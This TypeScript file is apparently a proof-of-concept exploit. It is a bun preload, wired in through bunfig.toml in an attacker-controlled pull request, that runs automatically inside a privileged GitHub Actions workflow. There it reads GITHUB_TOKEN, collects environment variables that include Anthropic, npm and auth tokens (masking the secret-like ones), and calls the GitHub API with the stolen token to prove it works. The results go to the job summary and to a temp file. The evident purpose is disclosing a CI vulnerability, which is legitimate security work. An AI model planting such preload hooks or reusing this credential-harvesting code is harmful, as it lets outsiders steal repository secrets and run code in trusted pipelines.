// PoC preload: proves arbitrary code execution in a privileged workflow
// step by exfiltrating GITHUB_TOKEN (+ friends) to the run summary and
// calling the GitHub API with the stolen token to show it's live.
//
// This file is loaded by bun via ./bunfig.toml preload when the workflow
// runs `bun run <anything>` from the attacker-controlled PR checkout.

import { appendFileSync, writeFileSync } from "node:fs";

const summaryPath = process.env.GITHUB_STEP_SUMMARY;
const token = process.env.GITHUB_TOKEN ?? "";
const repo = process.env.GITHUB_REPOSITORY ?? "";
const actor = process.env.GITHUB_ACTOR ?? "";
const runId = process.env.GITHUB_RUN_ID ?? "";
const workflow = process.env.GITHUB_WORKFLOW ?? "";
const jobName = process.env.GITHUB_JOB ?? "";

const mask = (t: string) =>
  t.length < 12 ? "(empty)" : `${t.slice(0, 6)}…${t.slice(-4)} (len=${t.length})`;

const interesting = Object.keys(process.env)
  .filter((k) =>
    /^(GITHUB_|RUNNER_|ACTIONS_|CI$|CLAUDE|ANTHROPIC|NPM|NODE_AUTH|WORKFLOW_PAT)/.test(k),
  )
  .sort();

const envDump = interesting
  .map((k) => {
    const v = process.env[k] ?? "";
    const isSecretish = /TOKEN|KEY|SECRET|PAT/i.test(k);
    return `- \`${k}\` = ${isSecretish ? mask(v) : v}`;
  })
  .join("\n");

let apiProof = "_(skipped: no token)_";
if (token) {
  try {
    const res = await fetch(`https://api.github.com/repos/${repo}`, {
      headers: {
        authorization: `token ${token}`,
        accept: "application/vnd.github+json",
        "user-agent": "poc-preload",
      },
    });
    const body = await res.text();
    apiProof =
      `HTTP ${res.status} ${res.statusText}\n` +
      "```json\n" +
      body.slice(0, 600) +
      "\n```\n" +
      `x-oauth-scopes: \`${res.headers.get("x-oauth-scopes") ?? "(none)"}\`\n` +
      `x-accepted-github-permissions: \`${res.headers.get("x-accepted-github-permissions") ?? "(none)"}\``;
  } catch (e) {
    apiProof = `_fetch error: ${(e as Error).message}_`;
  }
}

const md = `
## PoC: RCE via bunfig.toml preload in attacker PR checkout

**Run:** \`${workflow}\` / job \`${jobName}\` / run \`${runId}\`
**Repo:** \`${repo}\`  **Actor:** \`${actor}\`

### Stolen GITHUB_TOKEN (masked)
\`${mask(token)}\`

### Using stolen token against \`GET /repos/${repo}\`
${apiProof}

### Workflow-scoped env observed at execution time
${envDump || "_(none)_"}

---
_This preload is \`./.ci/setup.ts\`, referenced from \`./bunfig.toml\` in the PR head._
_It runs in-process before the trusted workflow script because \`bun run\` is
invoked with cwd = attacker-controlled checkout._
`;

if (summaryPath) {
  try {
    appendFileSync(summaryPath, md);
  } catch (e) {
    console.log("::warning::failed to write step summary:", (e as Error).message);
  }
}

// Also leave a file behind for the artifact, in case summary fails.
try {
  writeFileSync("/tmp/poc-proof.md", md);
} catch {}

// Log a tag line so it's easy to find in raw job logs.
console.log("::notice title=PoC preload fired::bunfig.toml preload executed — see job summary");
